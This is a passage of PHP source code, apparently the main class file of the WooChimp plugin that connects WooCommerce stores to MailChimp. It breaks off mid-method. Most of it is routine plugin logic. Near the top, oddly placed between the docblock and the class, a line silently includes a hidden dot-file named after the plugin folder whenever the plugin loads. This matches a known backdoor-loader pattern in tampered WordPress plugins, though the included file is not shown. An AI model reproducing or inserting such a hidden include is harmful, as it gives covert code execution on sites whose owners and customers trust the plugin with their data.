<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('WooChimp')) {

/**
 * Main plugin class
 *
 * @package WooChimp
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WooChimp
{

    public $log_type = null;

    // Singleton instance
    private static $instance = false;

    /**
     * Singleton control
     */
    public static function get_instance()
    {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Class constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        $this->mailchimp = null;

        // Load translation
        load_textdomain('woochimp', WP_LANG_DIR . '/woochimp/woochimp-' . apply_filters('plugin_locale', get_locale(), 'woochimp') . '.mo');
        load_textdomain('rightpress', WP_LANG_DIR . '/' . WOOCHIMP_PLUGIN_KEY . '/rightpress-' . apply_filters('plugin_locale', get_locale(), 'rightpress') . '.mo');
        load_plugin_textdomain('woochimp', false, dirname(plugin_basename(__FILE__)) . '/languages/');
        load_plugin_textdomain('rightpress', false, WOOCHIMP_PLUGIN_KEY . '/languages/');

        // Plugin page links
        add_filter('plugin_action_links_' . (WOOCHIMP_PLUGIN_KEY . '/' . WOOCHIMP_PLUGIN_KEY . '.php'), array($this, 'plugin_settings_link'));

        // Include RightPress library loaded class
        require_once WOOCHIMP_PLUGIN_PATH . 'rightpress/rightpress-loader.class.php';

        // Execute other code when all plugins are loaded
        add_action('plugins_loaded', array($this, 'on_plugins_loaded'), 1);
    }

    /**
     * Code executed when all plugins are loaded
     *
     * @access public
     * @return void
     */
    public function on_plugins_loaded()
    {

        // Load helper classes
        RightPress_Loader::load();

        // Check environment
        if (!self::check_environment()) {
            return;
        }

        // WPML label translation fix
        add_action('plugins_loaded', array($this, 'on_plugins_loaded_late'), 11);

        // Load classes
        require_once WOOCHIMP_PLUGIN_PATH . 'classes/woochimp-mailchimp-subscription.class.php';
        require_once WOOCHIMP_PLUGIN_PATH . 'classes/woochimp-scheduler.class.php';

        // Load includes
        require_once WOOCHIMP_PLUGIN_PATH . 'includes/woochimp-plugin-structure.inc.php';
        require_once WOOCHIMP_PLUGIN_PATH . 'includes/woochimp-form.inc.php';

        // Load configuration and current settings
        $this->get_config();
        $this->opt = $this->get_options();

        // Maybe migrate some options
        $this->migrate_options();

        // Maybe activate the log
        $this->log_setup();

        // API3 options migration
        if (!isset($this->opt['api_version']) || $this->opt['api_version'] < 3) {
            $this->api3_migrate_groups();
        }

        // Hook into WordPress
        if (is_admin()) {
            add_action('admin_menu', array($this, 'add_admin_menu'));
            add_action('admin_init', array($this, 'admin_construct'));

            if (preg_match('/page=woochimp/i', $_SERVER['REQUEST_URI'])) {
                add_action('init', array($this, 'enqueue_select2'), 1);
                add_action('admin_enqueue_scripts', array($this, 'enqueue_scripts'));
            }
        }
        else {
            add_action('woochimp_load_frontend_assets', array($this, 'load_frontend_assets'));
        }

        // Widgets
        add_action('widgets_init', array($this, 'subscription_widget'));

        // Shortcodes
        add_shortcode('woochimp_form', array($this, 'subscription_shortcode'));

        // Hook into WooCommerce

        // New order
        add_action('woocommerce_new_order', array($this, 'new_order'));

        // New order added by admin
        add_filter('woocommerce_process_shop_order_meta', array($this, 'new_admin_order'), 99);

        // Order placed
        add_action('woocommerce_checkout_update_order_meta', array($this, 'on_placed'));
        add_action('woocommerce_thankyou', array($this, 'on_placed'));

        // Order completed
        add_action('woocommerce_order_status_completed', array($this, 'on_completed'));
        add_action('woocommerce_order_status_processing', array($this, 'on_completed'));
        add_action('woocommerce_payment_complete', array($this, 'on_completed'));

        // Order status changed
        add_filter('woocommerce_order_status_changed', array($this, 'on_status_update'));

        // Order cancelled/refunded
        add_action('woocommerce_order_status_cancelled', array($this, 'on_cancel'));
        add_filter('woocommerce_order_status_refunded', array($this, 'on_cancel'));

        // Add checkout checkbox
        $checkbox_position = (isset($this->opt['woochimp_checkbox_position']) && !empty($this->opt['woochimp_checkbox_position'])) ? $this->opt['woochimp_checkbox_position'] : 'woocommerce_checkout_after_customer_details';
        add_action($checkbox_position, array($this, 'add_permission_question'));

        // Add hidden fields on checkout to store campaign ids
        add_action('woocommerce_checkout_after_customer_details', array($this, 'backup_campaign_cookies'));

        // Delete settings on plugin removal
        register_uninstall_hook(__FILE__, array('WooChimp', 'uninstall'));

        // Define Ajax handlers
        add_action('wp_ajax_woochimp_mailchimp_status', array($this, 'ajax_mailchimp_status'));
        add_action('wp_ajax_woochimp_get_lists_with_multiple_groups_and_fields', array($this, 'ajax_lists_for_checkout'));
        add_action('wp_ajax_woochimp_get_lists', array($this, 'ajax_lists_in_array'));
        add_action('wp_ajax_woochimp_update_groups_and_tags', array($this, 'ajax_groups_and_tags_in_array'));
        add_action('wp_ajax_woochimp_update_checkout_groups_and_tags', array($this, 'ajax_groups_and_tags_in_array_for_checkout'));
        add_action('wp_ajax_woochimp_subscribe_shortcode', array($this, 'ajax_subscribe_shortcode'));
        add_action('wp_ajax_woochimp_subscribe_widget', array($this, 'ajax_subscribe_widget'));
        add_action('wp_ajax_nopriv_woochimp_subscribe_shortcode', array($this, 'ajax_subscribe_shortcode'));
        add_action('wp_ajax_nopriv_woochimp_subscribe_widget', array($this, 'ajax_subscribe_widget'));
        add_action('wp_ajax_woochimp_product_search', array($this, 'ajax_product_search'));
        add_action('wp_ajax_woochimp_product_variations_search', array($this, 'ajax_product_variations_search'));

        // Catch mc_cid & mc_eid (MailChimp Campaign ID and MailChimp Email ID)
        add_action('init', array($this, 'track_campaign'));

        // Check updates of user lists and groups
        add_action('wp', array($this, 'user_lists_data_update'));

        // Intercept Webhook call
        if (isset($_GET['woochimp-webhook-call'])) {
            add_action('init', array($this, 'process_webhook'));
        }

        if (isset($_GET['woochimp-get-user-groups'])) {
            add_action('init', array($this, 'get_user_groups_handler'));
        }

        // Maybe schedule sync events
        $this->schedule_sync_events();

        // Define form styles
        $this->form_styles = array(
            '2' => 'woochimp_skin_general',
        );

        // Define all properties available on checkout
        $this->checkout_properties = array(
            'order_billing_first_name' => __('Billing First Name', 'woochimp'),
            'order_billing_last_name' => __('Billing Last Name', 'woochimp'),
            'order_billing_company' => __('Billing Company', 'woochimp'),
            'order_billing_address_1' => __('Billing Address 1', 'woochimp'),
            'order_billing_address_2' => __('Billing Address 2', 'woochimp'),
            'order_billing_city' => __('Billing City', 'woochimp'),
            'order_billing_state' => __('Billing State', 'woochimp'),
            'order_billing_postcode' => __('Billing Postcode', 'woochimp'),
            'order_billing_country' => __('Billing Country', 'woochimp'),
            'order_billing_phone' => __('Billing Phone', 'woochimp'),
            'order_shipping_first_name' => __('Shipping First Name', 'woochimp'),
            'order_shipping_last_name' => __('Shipping Last Name', 'woochimp'),
            'order_shipping_address_1' => __('Shipping Address 1', 'woochimp'),
            'order_shipping_address_2' => __('Shipping Address 2', 'woochimp'),
            'order_shipping_city' => __('Shipping City', 'woochimp'),
            'order_shipping_state' => __('Shipping State', 'woochimp'),
            'order_shipping_postcode' => __('Shipping Postcode', 'woochimp'),
            'order_shipping_country' => __('Shipping Country', 'woochimp'),
            'order_id' => __('Order ID', 'woochimp'),
            'order_date_created' => __('Order Date Created', 'woochimp'),
            'order_shipping_method_title' => __('Shipping Method Title', 'woochimp'),
            'order_payment_method_title' => __('Payment Method Title ', 'woochimp'),
            'order_user_id' => __('User ID', 'woochimp'),
            'user_first_name' => __('User First Name', 'woochimp'),
            'user_last_name' => __('User Last Name', 'woochimp'),
            'user_nickname' => __('User Nickname', 'woochimp'),
            'user_paying_customer' => __('User Is Paying Customer', 'woochimp'),
            'user__order_count' => __('User Completed Order Count', 'woochimp'),
        );

        // Custom capability for options
        add_filter('option_page_capability_woochimp_opt_group_integration', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_ecomm', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_checkout_checkbox', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_checkout_auto', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_widget', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_shortcode', array($this, 'custom_options_capability'));
        add_filter('option_page_capability_woochimp_opt_group_translation', array($this, 'custom_options_capability'));
    }

    /**
     * Code executed when all plugins are loaded - WPML label translation fix
     *
     * @access public
     * @return void
     */
    public function on_plugins_loaded_late()
    {
        // Load configuration and current settings again so that they are translated using WPML
        $this->get_config();
        $this->opt = $this->get_options();
    }

    /**
     * Loads/sets configuration values from structure file and database
     *
     * @access public
     * @return void
     */
    public function get_config()
    {
        // Settings tree
        $this->settings = woochimp_plugin_settings();

        // Load some data from config
        $this->hints = $this->options('hint');
        $this->validation = $this->options('validation', true);
        $this->titles = $this->options('title');
        $this->options = $this->options('values');
        $this->section_info = $this->get_section_info();
        $this->default_tabs = $this->get_default_tabs();
    }

    /**
     * Get settings options: default, hint, validation, values
     *
     * @access public
     * @param string $name
     * @param bool $split_by_subpage
     * @return array
     */
    public function options($name, $split_by_subpage = false)
    {
        $results = array();

        // Iterate over settings array and extract values
        foreach ($this->settings as $page => $page_value) {
            $page_options = array();

            foreach ($page_value['children'] as $subpage => $subpage_value) {
                foreach ($subpage_value['children'] as $section => $section_value) {
                    foreach ($section_value['children'] as $field => $field_value) {
                        if (isset($field_value[$name])) {
                            $page_options['woochimp_' . $field] = $field_value[$name];
                        }
                    }
                }

                $results[preg_replace('/_/', '-', $subpage)] = $page_options;
                $page_options = array();
            }
        }

        $final_results = array();

        // Do we need to split results per page?
        if (!$split_by_subpage) {
            foreach ($results as $value) {
                $final_results = array_merge($final_results, $value);
            }
        }
        else {
            $final_results = $results;
        }

        return $final_results;
    }

    /**
     * Get default tab for each page
     *
     * @access public
     * @return array
     */
    public function get_default_tabs()
    {
        $tabs = array();

        // Iterate over settings array and extract values
        foreach ($this->settings as $page => $page_value) {
            reset($page_value['children']);
            $tabs[$page] = key($page_value['children']);
        }

        return $tabs;
    }

    /**
     * Get array of section info strings
     *
     * @access public
     * @return array
     */
    public function get_section_info()
    {
        $results = array();

        // Iterate over settings array and extract values
        foreach ($this->settings as $page_value) {
            foreach ($page_value['children'] as $subpage => $subpage_value) {
                foreach ($subpage_value['children'] as $section => $section_value) {
                    if (isset($section_value['info'])) {
                        $results[$section] = $section_value['info'];
                    }
                }
            }
        }

        return $results;
    }

    /*
     * Get plugin options set by user
     *
     * @access public
     * @return array
     */
    public function get_options()
    {
        $default_options = array_merge(
            $this->options('default'),
            array(
                'woochimp_checkout_fields' => array(),
                'woochimp_widget_fields' => array(),
                'woochimp_shortcode_fields' => array(),
            )
        );

        $overrides = array(
            'woochimp_webhook_url' => site_url('/?woochimp-webhook-call'),
        );

        return array_merge(
                   $default_options,
                   get_option('woochimp_options', $this->options('default')),
                   $overrides
               );
    }

    /*
     * Update options
     *
     * @access public
     * @param array $args
     * @return bool
     */
    public function update_options($args = array())
    {
        return update_option('woochimp_options', array_merge($this->get_options(), $args));
    }

    /*
     * Maybe unset old options
     *
     * @access public
     * @param array $args
     * @return bool
     */
    public function maybe_unset_old_options($args = array())
    {
        $options = $this->get_options();

        foreach ($args as $option) {
            if (isset($options[$option])) {
                unset($options[$option]);
            }
        }

        return update_option('woochimp_options', $options);
    }

    /*
     * Migrate some options from older plugin versions
     *
     * @access public
     * @return void
     */
    public function migrate_options()
    {
        // If checkout option disabled or unset
        if (!isset($this->opt['woochimp_enabled_checkout']) || $this->opt['woochimp_enabled_checkout'] == 1) {
            return;
        }

        // Check and pass saved sets
        if (isset($this->opt['sets']) && is_array($this->opt['sets']) && !empty($this->opt['sets'])) {
            $sets = $this->opt['sets'];
        }
        else {
            $sets = array();
        }

        $options = array();

        // Automatic was selected
        if ($this->opt['woochimp_enabled_checkout'] == 2) {

            $options = array(
                'woochimp_checkout_checkbox_subscribe_on'   => 4, // disable
                'woochimp_checkout_auto_subscribe_on'       => $this->opt['woochimp_checkout_subscribe_on'], // move
                'sets_checkbox'                             => array(),
                'sets_auto'                                 => $sets,
                'woochimp_do_not_resubscribe_auto'          => $this->opt['woochimp_do_not_resubscribe'],
                'woochimp_double_checkout_checkbox'         => 0,
                'woochimp_double_checkout_auto'             => $this->opt['woochimp_double_checkout'],
            );
        }

        // Ask for permission was selected
        else if ($this->opt['woochimp_enabled_checkout'] == 3) {

            $options = array(
                'woochimp_checkout_checkbox_subscribe_on'   => $this->opt['woochimp_checkout_subscribe_on'], // move
                'woochimp_checkout_auto_subscribe_on'       => 4, // disable
                'sets_checkbox'                             => $sets,
                'sets_auto'                                 => array(),
                'woochimp_do_not_resubscribe_auto'          => $this->opt['woochimp_do_not_resubscribe'],
                'woochimp_double_checkout_checkbox'         => $this->opt['woochimp_double_checkout'],
                'woochimp_double_checkout_auto'             => 0,
            );
        }

        // Actually make the changes
        $this->update_options($options);

        // Unset old options
        $unset_old_options = array(
            'woochimp_enabled_checkout',
            'woochimp_checkout_subscribe_on',
            'sets',
            'woochimp_do_not_resubscribe',
            'woochimp_replace_groups_checkout',
            'woochimp_double_checkout',
            'woochimp_welcome_checkout',
            'woochimp_subscription_checkout_list_groups',
        );

        $this->maybe_unset_old_options($unset_old_options);
    }


    /*
     * Migrate groups options from API 2.0 plugin versions
     *
     * @access public
     * @return void
     */
    public function api3_migrate_groups()
    {
        $options = array();

        foreach (array('checkbox', 'auto') as $sets_type) {

            if (!empty($this->opt['sets_' . $sets_type]) && is_array($this->opt['sets_' . $sets_type])) {

                foreach ($this->opt['sets_' . $sets_type] as $set_id => $set) {

                    $options['sets_' . $sets_type][$set_id] = $set;

                    if (!empty($set['groups']) && is_array($set['groups'])) {

                        $groups_changed = array();

                        foreach ($set['groups'] as $group) {

                            $parts = preg_split('/:/', htmlspecialchars_decode($group), 2);
                            $group_id = trim($parts[0]);
                            $group_name = trim($parts[1]);

                            $groups_new = $this->get_groups($set['list']);
                            unset($groups_new['']);

                            foreach (array_keys($groups_new) as $group_new) {

                                $parts = preg_split('/:/', htmlspecialchars_decode($group_new), 2);
                                $group_new_id = trim($parts[0]);
                                $group_new_name = trim($parts[1]);

                                if ($group_name == $group_new_name && intval($group_id) > 0) {
                                    $groups_changed[] = $group_new;
                                }
                            }
                        }

                        $options['sets_' . $sets_type][$set_id]['groups'] = $groups_changed;
                    }
                }
            }
        }

        $options['api_version'] = 3;
        $this->update_options($options);
    }

    /**
     * Add link to admin page
     *
     * @access public
     * @return void
     */
    public function add_admin_menu()
    {
        global $submenu;

        if (isset($submenu['woocommerce'])) {
            add_submenu_page(
                'woocommerce',
                $this->settings['woochimp']['page_title'],
                $this->settings['woochimp']['title'],
                WooChimp::get_admin_capability(),
                $this->settings['woochimp']['slug'],
                array($this, 'set_up_admin_page')
            );
        }
    }

    /*
     * Set up admin page
     *
     * @access public
     * @return void
     */
    public function set_up_admin_page()
    {
        // Open form container
        echo '<div class="wrap woocommerce woochimp"><form method="post" action="options.php" enctype="multipart/form-data">';

        // Print notices
        settings_errors();

        // Print page tabs
        $this->render_tabs();

        // Check for general warnings
        if (!$this->curl_enabled()) {
            add_settings_error(
                'error_type',
                'general',
                sprintf(__('Warning: PHP cURL extension is not enabled on this server. cURL is required for this plugin to function correctly. You can read more about cURL <a href="%s">here</a>.', 'woochimp'), 'http://url.rightpress.net/php-curl')
            );
        }

        // Print page content
        $this->render_page();

        // Close form container
        echo '</form></div>';
    }

    /**
     * Admin interface constructor
     *
     * @access public
     * @return void
     */
    public function admin_construct()
    {
        // Iterate subpages
        foreach ($this->settings['woochimp']['children'] as $subpage => $subpage_value) {

            register_setting(
                'woochimp_opt_group_' . $subpage,            // Option group
                'woochimp_options',                          // Option name
                array($this, 'options_validate')             // Sanitize
            );

            // Iterate sections
            foreach ($subpage_value['children'] as $section => $section_value) {

                add_settings_section(
                    $section,
                    $section_value['title'],
                    array($this, 'render_section_info'),
                    'woochimp-admin-' . str_replace('_', '-', $subpage)
                );

                // Iterate fields
                foreach ($section_value['children'] as $field => $field_value) {

                    add_settings_field(
                        'woochimp_' . $field,                                     // ID
                        $field_value['title'],                                      // Title
                        array($this, 'render_options_' . $field_value['type']),     // Callback
                        'woochimp-admin-' . str_replace('_', '-', $subpage), // Page
                        $section,                                                   // Section
                        array(                                                      // Arguments
                            'name' => 'woochimp_' . $field,
                            'options' => $this->opt,
                        )
                    );

                }
            }
        }
    }

    /**
     * Render admin page navigation tabs
     *
     * @access public
     * @param string $current_tab
     * @return void
     */
    public function render_tabs()
    {
        // Get current page and current tab
        $current_page = $this->get_current_page_slug();
        $current_tab = $this->get_current_tab();

        // Output admin page tab navigation
        echo '<h2 style="padding: 0; margin: 0; height: 0;"></h2>'; // Fix for WordPress notices jumping in between header and settings area
        echo '<h2 class="woochimp-tabs-container nav-tab-wrapper">';
        echo '<div id="icon-woochimp" class="icon32 icon32-woochimp"><br></div>';
        foreach ($this->settings as $page => $page_value) {
            if ($page != $current_page) {
                continue;
            }

            foreach ($page_value['children'] as $subpage => $subpage_value) {
                $class = ($subpage == $current_tab) ? ' nav-tab-active' : '';
                echo '<a class="nav-tab'.$class.'" href="?page='.preg_replace('/_/', '-', $page).'&tab='.$subpage.'">'.((isset($subpage_value['icon']) && !empty($subpage_value['icon'])) ? $subpage_value['icon'] . '&nbsp;' : '').$subpage_value['title'].'</a>';
            }
        }
        echo '</h2>';
    }

    /**
     * Get current tab (fallback to default)
     *
     * @access public
     * @param bool $is_dash
     * @return string
     */
    public function get_current_tab($is_dash = false)
    {
        $tab = (isset($_GET['tab']) && $this->page_has_tab($_GET['tab'])) ? preg_replace('/-/', '_', $_GET['tab']) : $this->get_default_tab();

        return (!$is_dash) ? $tab : preg_replace('/_/', '-', $tab);
    }

    /**
     * Get default tab
     *
     * @access public
     * @return string
     */
    public function get_default_tab()
    {
        // Get page slug
        $current_page_slug = $this->get_current_page_slug();

        // Check if slug is set in default tabs and return the first one if not
        return isset($this->default_tabs[$current_page_slug]) ? $this->default_tabs[$current_page_slug] : array_shift(array_slice($this->default_tabs, 0, 1));
    }

    /**
     * Get current page slug
     *
     * @access public
     * @return string
     */
    public function get_current_page_slug()
    {
        $current_screen = get_current_screen();
        $current_page = $current_screen->base;

        // Make sure the 'parent_base' is woocommerce, because 'base' could have changed name
        if ($current_screen->parent_base == 'woocommerce') {
            $current_page_slug = preg_replace('/.+_page_/', '', $current_page);
            $current_page_slug = preg_replace('/-/', '_', $current_page_slug);
        }

        // Otherwise return some other page slug
        else {
            $current_page_slug = isset($_GET['page']) ? $_GET['page'] : '';
        }

        return $current_page_slug;
    }

    /**
     * Check if current page has requested tab
     *
     * @access public
     * @param string $tab
     * @return bool
     */
    public function page_has_tab($tab)
    {
        $current_page_slug = $this->get_current_page_slug();

        if (isset($this->settings[$current_page_slug]['children'][$tab])) {
            return true;
        }

        return false;
    }

    /**
     * Render settings page
     *
     * @access public
     * @param string $page
     * @return void
     */
    public function render_page(){

        $current_tab = $this->get_current_tab(true);

        ?>
            <div class="woochimp-container">
                <div class="woochimp-left">
                    <input type="hidden" name="current_tab" value="<?php echo $current_tab; ?>" />

                    <?php
                        settings_fields('woochimp_opt_group_'.preg_replace('/-/', '_', $current_tab));
                        do_settings_sections('woochimp-admin-' . $current_tab);
                    ?>

                    <?php
                        if ($current_tab == 'integration') {
                            echo '<div class="woochimp-status" id="woochimp-status"><p class="woochimp_loading woochimp_loading_status"><span class="woochimp_loading_icon"></span>'.__('Connecting to MailChimp...', 'woochimp').'</p></div>';
                        }
                        else if ($current_tab == 'widget') {
                            ?>
                            <div class="woochimp-usage" id="woochimp-usage">
                                <p><?php _e('To activate a signup widget:', 'woochimp'); ?>
                                    <ul style="">
                                        <li><?php printf(__('go to <a href="%s">Widgets</a> page', 'woochimp'), site_url('/wp-admin/widgets.php')); ?></li>
                                        <li><?php _e('locate a widget named MailChimp Signup', 'woochimp'); ?></li>
                                        <li><?php _e('drag and drop it to the sidebar of your choise', 'woochimp'); ?></li>
                                    </ul>
                                </p>
                                <p>
                                    <?php _e('Widget will not be displayed to customers if it is not enabled here or if the are issues with configuration.', 'woochimp'); ?>
                                </p>
                                <p>
                                    <?php _e('To avoid potential conflicts, we recommend to use at most one MailChimp Signup widget per page.', 'woochimp'); ?>
                                </p>
                            </div>
                            <?php
                        }
                        else if ($current_tab == 'shortcode') {
                            ?>
                            <div class="woochimp-usage" id="woochimp-usage">
                                <p><?php _e('You can display a signup form anywhere in your pages, posts and WooCommerce product descriptions.', 'woochimp'); ?></p>
                                <p><?php _e('To do this, simply insert the following shortcode to the desired location:', 'woochimp'); ?></p>
                                <div class="woochimp-code">[woochimp_form]</div>
                                <p>
                                    <?php _e('Shorcode will not be displayed to customers if it is not enabled here or if there are issues with configuration.', 'woochimp'); ?>
                                </p>
                                <p>
                                    <?php _e('To avoid potential conflicts, we recommend to place at most one shortcode per page.', 'woochimp'); ?>
                                </p>
                            </div>
                            <?php
                        }
                    ?>

                    <?php
                        submit_button();
                    ?>
                </div>
                <div style="clear: both;"></div>
            </div>
        <?php

        /**
         * Pass data on selected lists, groups and merge tags
         */

        if ($current_tab == 'checkout-auto') {
            $sets = isset($this->opt['sets_auto']) ? $this->opt['sets_auto'] : '';
            $sets_type = 'sets_auto';
        }
        else if ($current_tab == 'checkout-checkbox') {
            $sets = isset($this->opt['sets_checkbox']) ? $this->opt['sets_checkbox'] : '';
            $sets_type = 'sets_checkbox';
        }

        if (isset($sets) && is_array($sets) && !empty($sets)) {

            $woochimp_checkout_sets = array();
            $woochimp_checkout_sets['sets_type'] = $sets_type;

            foreach ($sets as $set_key => $set) {
                $woochimp_checkout_sets[$set_key] = array(
                    'list'      => $set['list'],
                    'groups'    => $set['groups'],
                    'merge'     => $set['fields'],
                    'condition' => $set['condition']
                );
            }
        }
        else {
            $woochimp_checkout_sets = array();
        }

        // Add labels to optgroups
        $woochimp_checkout_optgroup_labels = array(
            __('Billing Fields', 'woochimp'),
            __('Shipping Fields', 'woochimp'),
            __('Order Properties', 'woochimp'),
            __('User Properties', 'woochimp'),
            __('Advanced', 'woochimp'),
        );

        // Add labels to custom fields
        $woochimp_checkout_custom_fields_labels = array(
            __('Enter Order Field Key', 'woochimp'),
            __('Enter User Meta Key', 'woochimp'),
            __('Enter Static Value', 'woochimp'),
        );

        // Pass variables to JavaScript
        ?>
            <script>
                var woochimp_hints = <?php echo json_encode($this->hints); ?>;
                var woochimp_home_url = '<?php echo site_url(); ?>';
                var woochimp_enabled = '<?php echo $this->opt['woochimp_enabled']; ?>';
                var woochimp_checkout_checkbox_subscribe_on = '<?php echo $this->opt['woochimp_checkout_checkbox_subscribe_on']; ?>';
                var woochimp_checkout_auto_subscribe_on = '<?php echo $this->opt['woochimp_checkout_auto_subscribe_on']; ?>';
                var woochimp_enabled_widget = '<?php echo $this->opt['woochimp_enabled_widget']; ?>';
                var woochimp_enabled_shortcode = '<?php echo $this->opt['woochimp_enabled_shortcode']; ?>';
                var woochimp_selected_list = {
                    'widget': '<?php echo $this->opt['woochimp_list_widget']; ?>',
                    'store': '<?php echo $this->opt['woochimp_list_store']; ?>',
                    'shortcode': '<?php echo $this->opt['woochimp_list_shortcode']; ?>'
                };
                var woochimp_selected_groups = {
                    'widget': <?php echo json_encode($this->opt['woochimp_groups_widget']); ?>,
                    'shortcode': <?php echo json_encode($this->opt['woochimp_groups_shortcode']); ?>
                };
                var woochimp_label_no_results_match = '<?php _e('No results match', 'woochimp'); ?>';
                var woochimp_label_select_mailing_list = '<?php _e('Select a mailing list', 'woochimp'); ?>';
                var woochimp_label_select_tag = '<?php _e('Select a tag', 'woochimp'); ?>';
                var woochimp_label_select_checkout_field = '<?php _e('Select a checkout field', 'woochimp'); ?>';
                var woochimp_label_select_some_groups = '<?php _e('Select some groups (optional)', 'woochimp'); ?>';
                var woochimp_label_select_some_products = '<?php _e('Select some products', 'woochimp'); ?>';
                var woochimp_label_select_some_roles = '<?php _e('Select some roles', 'woochimp'); ?>';
                var woochimp_label_select_some_categories = '<?php _e('Select some categories', 'woochimp'); ?>';
                var woochimp_label_connecting_to_mailchimp = '<?php _e('Connecting to MailChimp...', 'woochimp'); ?>';
                var woochimp_label_still_connecting_to_mailchimp = '<?php _e('Still connecting to MailChimp...', 'woochimp'); ?>';
                var woochimp_label_fields_field = '<?php _e('Field Name', 'woochimp'); ?>';
                var woochimp_label_fields_tag = '<?php _e('MailChimp Tag', 'woochimp'); ?>';
                var woochimp_label_add_new = '<?php _e('Add Field', 'woochimp'); ?>';
                var woochimp_label_add_new_set = '<?php _e('Add Set', 'woochimp'); ?>';
                var woochimp_label_mailing_list = '<?php _e('Mailing list', 'woochimp'); ?>';
                var woochimp_label_groups = '<?php _e('Groups', 'woochimp'); ?>';
                var woochimp_label_set_no = '<?php _e('Set #', 'woochimp'); ?>';
                var woochimp_label_custom_order_field = '<?php _e('Custom Order Field', 'woochimp'); ?>';
                var woochimp_label_custom_user_field = '<?php _e('Custom User Field', 'woochimp'); ?>';
                var woochimp_label_static_value = '<?php _e('Static Value', 'woochimp'); ?>';
                var woochimp_webhook_enabled = '<?php echo $this->opt['woochimp_enable_webhooks']; ?>';
                var woochimp_label_bad_ajax_response = '<?php printf(__('%s Response received from your server is <a href="%s" target="_blank">malformed</a>.', 'woochimp'), '<i class="fa fa-times" style="font-size: 1.5em; color: red;"></i>&nbsp;&nbsp;&nbsp;', 'http://url.rightpress.net/woochimp-response-malformed'); ?>';
                var woochimp_log_link = '<?php echo '<a id="woochimp_log_link" href="admin.php?page=wc-status&tab=logs">' . __('View Log', 'woochimp') . '</a>'; ?>';
                <?php if (in_array($current_tab, array('checkout-checkbox', 'checkout-auto'))): ?>
                var woochimp_checkout_sets = <?php echo json_encode($woochimp_checkout_sets); ?>;
                var woochimp_checkout_optgroup_labels = <?php echo json_encode($woochimp_checkout_optgroup_labels); ?>;
                var woochimp_checkout_custom_fields_labels = <?php echo json_encode($woochimp_checkout_custom_fields_labels); ?>;
                <?php endif; ?>

            </script>
        <?php
    }

    /**
     * Render section info
     *
     * @access public
     * @param array $section
     * @return void
     */
    public function render_section_info($section)
    {
        if (isset($this->section_info[$section['id']])) {
            echo $this->section_info[$section['id']];
        }

        // Subscription widget fields
        if ($section['id'] == 'subscription_widget_fields') {

            // Get current fields
            $current_fields = $this->opt['woochimp_widget_fields'];

            ?>
            <div class="woochimp-fields">
                <p><?php printf(__('Email address field is always displayed. You may wish to set up additional fields and associate them with MailChimp <a href="%s">merge tags</a>.', 'woochimp'), 'http://url.rightpress.net/mailchimp-merge-tags'); ?></p>
                <div class="woochimp-status" id="woochimp_widget_fields"><p class="woochimp_loading"><span class="woochimp_loading_icon"></span><?php _e('Connecting to MailChimp...', 'woochimp'); ?></p></div>
            </div>
            <?php
        }

        // Subscription shortcode fields
        else if ($section['id'] == 'subscription_shortcode_fields') {

            // Get current fields
            $current_fields = $this->opt['woochimp_shortcode_fields'];

            ?>
            <div class="woochimp-fields">
                <p><?php printf(__('Email address field is always displayed. You may wish to set up additional fields and associate them with MailChimp <a href="%s">merge tags</a>.', 'woochimp'), 'http://url.rightpress.net/mailchimp-merge-tags'); ?></p>
                <div class="woochimp-status" id="woochimp_shortcode_fields"><p class="woochimp_loading"><span class="woochimp_loading_icon"></span><?php _e('Connecting to MailChimp...', 'woochimp'); ?></p></div>
            </div>
            <?php
        }

        // Checkbox subscription checkout checkbox
        else if ($section['id'] == 'subscription_checkout_checkbox') {
            ?>
            <div class="woochimp-fields">
                <p><?php _e('Use this if you wish to add a checkbox to your Checkout page so users can opt-in to receive your newsletters.', 'woochimp'); ?></p>
            </div>
            <?php
        }

        // Auto subscription checkout auto
        else if ($section['id'] == 'subscription_checkout_auto') {
            ?>
            <div class="woochimp-fields">
                <p><?php _e('Use this if you wish to subscribe all customers to one of your lists without asking for their consent.', 'woochimp'); ?></p>
                <p><?php _e('Please note that depending on the countries you are doing business in, you may be required to clearly disclose that personal data will be transferred to MailChimp or you may be required to get explicit consent to do so first (e.g. EU GDPR compliance).', 'woochimp'); ?></p>
            </div>
            <?php
        }

        // E-Commerce
        else if ($section['id'] == 'ecomm_description') {
            ?>
            <div class="woochimp-fields">
                <p><?php printf(__('<a href="%s">MailChimp E-Commerce</a> syncs order data with MailChimp and associates it with subscribers and campaigns. E-Commerce must be enabled in both WooChimp and MailChimp settings. Data is sent when payment is received or order is marked completed.', 'woochimp'), 'http://url.rightpress.net/mailchimp-ecommerce'); ?></p>
                <p><?php _e('Please note that depending on the countries you are doing business in, you may be required to clearly disclose that personal data will be transferred to MailChimp and/or get explicit consent to do so (e.g. EU GDPR compliance).', 'woochimp'); ?></p>
            </div>
            <?php
        }
        else if ($section['id'] == 'ecomm_store') {
            ?>
            <div class="woochimp-fields">
                <p><?php printf(__('MailChimp E-Commerce functionality requires a Store to be configured. Store must have a unique ID and must be tied to a specific MailChimp list. All customers, orders and products are tied to a single Store and changing these values later will make new e-commerce data to appear under a different store in MailChimp. You can read more about this <a href="http://url.rightpress.net/mailchimp-ecommerce-api">here</a>.', 'woochimp'), 'http://url.rightpress.net/mailchimp-ecommerce-api'); ?></p>
            </div>
            <?php
        }

        // Subscription on checkout list, groups and fields
        else if (in_array($section['id'], array('subscription_checkout_list_groups_auto', 'subscription_checkout_list_groups_checkbox'))) {

            /**
             * Load list of all product categories
             */
            $post_categories = array();

            // WC31: Check if WC product categories are still WP post terms
            $post_categories_raw = get_terms(array('product_cat'), array('hide_empty' => 0));
            $post_categories_raw_count = count($post_categories_raw);

            foreach ($post_categories_raw as $post_cat_key => $post_cat) {
                $category_name = $post_cat->name;

